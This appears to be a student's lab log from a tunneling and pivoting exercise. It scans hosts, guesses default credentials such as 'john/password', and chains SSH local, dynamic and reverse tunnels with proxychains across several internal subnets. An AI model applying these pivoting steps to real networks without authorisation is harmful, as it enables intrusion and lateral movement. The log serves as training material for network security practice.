# Tunneling Practice

## Demo Network Exploration Log

Author: student@blue-internet-host

---

## Phase 0: Reconnaissance from Float IP (10.50.0.182)

Float IP: 10.50.0.182 -- External interface of blue-internet-host. Used to initiate scans and proxy-based access.

### Step 0 -- Initial Port Scan

From: blue-internet-host -> To: 10.50.63.101

```bash
nmap 10.50.63.101 -p 21,22,23,80
```

Results:
- Port 21: filtered (FTP)
- Port 22: open (SSH)
- Port 23: closed (Telnet)
- Port 80: open (HTTP)

### Step 0.1 -- SSH Banner Grab

```bash
nc 10.50.63.101 22
```

Output: `SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2`

### Step 0.2 -- HTTP Service Probe

```bash
nc 10.50.63.101 80
# Then: GET /
```

Output: HTML page referencing **John Vincent Atanasoff**

Hostname Inference: Based on HTTP content and file paths (`/usr/share/cctc/john.txt`). Hostname assigned: **john**. Credentials guessed: `john/password`.

### Step 0.3 -- SSH Authentication Test

```bash
ssh john@10.50.63.101
```

Login successful. Confirmed shell access to Debian GNU/Linux 10.

### Step 0.4 -- SOCKS Proxy Setup

```bash
ssh john@10.50.63.101 -D 9050
```

Dynamic port forwarding enabled. Proxychains ready for internal pivoting.

---

## Phase 1: Enumeration on Host "john" (10.50.63.101)

### Step 1 -- Internal Network Discovery

```bash
ip a
```

- Interface lo: 127.0.0.1/8
- Interface eth0: 104.16.181.1/27

### Step 2 -- ARP Table Scan

```bash
ip neighbor
```

- 104.16.181.15 -> STALE (MAC: b6:72:bb:49:87:7c)
- 104.16.181.30 -> REACHABLE (MAC: 0a:58:68:10:b5:1e)

### Step 3 -- Active Connections & Services

```bash
ss -plant
```

Listening: 21 (FTP), 22 (SSH), 80 (HTTP)

### Step 4 -- Sensitive File Discovery

```bash
ls /usr/share/cctc
```

Files: john.png, john.txt

### Step 5 -- File Content Review

```bash
cat /usr/share/cctc/john.txt
```

Output: Biography of John Vincent Atanasoff and the ABC.

### Step 6 -- Direct File Transfer

```bash
scp john@10.50.63.101:/usr/share/cctc/john.png ~
```

### Step 7 -- Proxy-Based File Transfer

```bash
proxychains scp john@localhost:/usr/share/cctc/john.txt .
```

### Step 8 -- Internal Subnet Scan via Proxy

```bash
proxychains ./scan.sh
```

Ports scanned: 21-23, 80. Results:
- 104.16.181.1 -> SSH (22), HTTP (80)
- 104.16.181.15 -> FTP (21), SSH (22), HTTP (80)
- 104.16.181.30 -> HTTP (80)

---

## Phase 2: Pivot to Host "jack" (104.16.181.15)

### Step 1 -- FTP Service Discovery

```bash
proxychains nc 104.16.181.15 21
```

Output: `220 ProFTPD Server (Debian) [::ffff:104.16.181.15]`

### Step 2 -- HTTP Content Retrieval

```bash
proxychains wget -r 104.16.181.15
```

Content: `<h1>Jack Tramiel</h1>` -- Founder of Commodore and later Atari Corporation.

Hostname assigned: **jack**. Credentials guessed: `jack/password`.

### Step 3 -- FTP File Retrieval

```bash
proxychains wget -r ftp://104.16.181.15
```

Files: ftp1.txt, ftp2.txt, welcome.msg

### Step 4 -- Tunnel Setup to "jack" via SSH Port Forwarding

```bash
ssh john@10.50.63.101 -L 1111:104.16.181.15:22
```

Local port 1111 now forwards to jack's SSH port.

### Step 5 -- SSH Login to "jack" via Local Tunnel

```bash
ssh -p 1111 jack@localhost -D 9050
```

SSH session established to jack. SOCKS proxy setup note: port 9050 may already be in use.

System Info: Hostname: jack, OS: Debian GNU/Linux 10

### Step 6 -- Interface Enumeration on "jack"

```bash
ip a
```

- eth0: 104.16.181.15/27 (MAC: b6:72:bb:49:87:7c)
- eth1: 142.16.8.55/27 (MAC: de:44:5c:9d:02:e4)

### Step 7 -- File Discovery and Transfer

```bash
ls /usr/share/cctc
# jack.png, jack.txt

proxychains scp jack@localhost:/usr/share/cctc/jack.png .
```

### Step 8 -- Enumeration of 142.16.8.41

```bash
proxychains nc 142.16.8.41 21
# Output: 220 ProFTPD Server (Debian)

proxychains wget -r http://142.16.8.41
proxychains wget -r ftp://142.16.8.41
```

Files retrieved: ftp1.txt, ftp2.txt, hint.txt, welcome.msg

Content of ftp1.txt: **Bill Gates**. Hostname assigned: **bill**. Credentials inferred: `bill/password`.

### Step 9 -- High-Port Scan on "bill"

Hint: "Bill seems to have an SSH port listening above the well-known range."

```bash
proxychains ./scan.sh
```

Result: Port 4567 open.

### Step 10 -- Local Port Forwarding to "bill"

```bash
ssh -p 1111 jack@localhost -L 2222:142.16.8.41:4567
```

Tunnel established: localhost:2222 -> bill:4567

### Step 11 -- SSH Access to "bill"

```bash
ssh bill@localhost -p 2222
```

SSH session established. System: Debian GNU/Linux 10.

### Step 12 -- Dynamic SOCKS Tunnel via "bill"

```bash
ssh -p 2222 bill@localhost -D 9050
```

SOCKS proxy active on localhost:9050.

### Step 13 -- Subnet Scan: 155.39.88.0/24 via "bill"

```bash
proxychains ./scan.sh
```

Results:
- 155.39.88.17 -> FTP (21), HTTP (80) open
- 155.39.88.21 -> FTP (21), Telnet (23), HTTP (80) open
- 155.39.88.30 -> HTTP (80) open

### Step 14 -- Service Probing "brian" (155.39.88.21)

HTTP response: Biography of **Brian Kernighan**. Hostname assigned: **brian**.

FTP files: ftp1.txt, ftp2.txt, hint.txt, welcome.msg

Hint: "Brian's SSH port seems to be only accessible from the inside. Telnet is open to external users though. Try to tunnel to his telnet port and create a SSH remote tunnel."

### Step 15 -- Local Port Forwarding to brian's Telnet

```bash
ssh -p 2222 bill@localhost -L 3333:155.39.88.21:23
```

### Step 16 -- Telnet Access to "brian"

```bash
telnet localhost 3333
```

Login: brian/password. Shell access granted on Debian GNU/Linux 10.

### Step 17 -- Interface Enumeration on "brian"

```bash
ip a
```

- eth0: 155.39.88.21/28
- eth1: 150.21.99.7/28

New subnet discovered: **150.21.99.0/28** via eth1.

### Step 18 -- Active Socket Enumeration

```bash
ss -plant
```

Listening: 21 (FTP), 22 (SSH), 23 (Telnet), 80 (HTTP)

### Step 19 -- Reverse SSH Tunnel from "brian" to "bill"

```bash
ssh bill@155.39.88.17 -p 4567 -R 21000:localhost:22
```

Reverse tunnel established: bill:21000 -> brian:22.

### Step 20 -- Bridging the Reverse Tunnel

From new terminal:

```bash
ssh -p 21000 brian@localhost
```

Full SSH shell access to brian confirmed -- direct SSH access without relying on Telnet or proxychains.
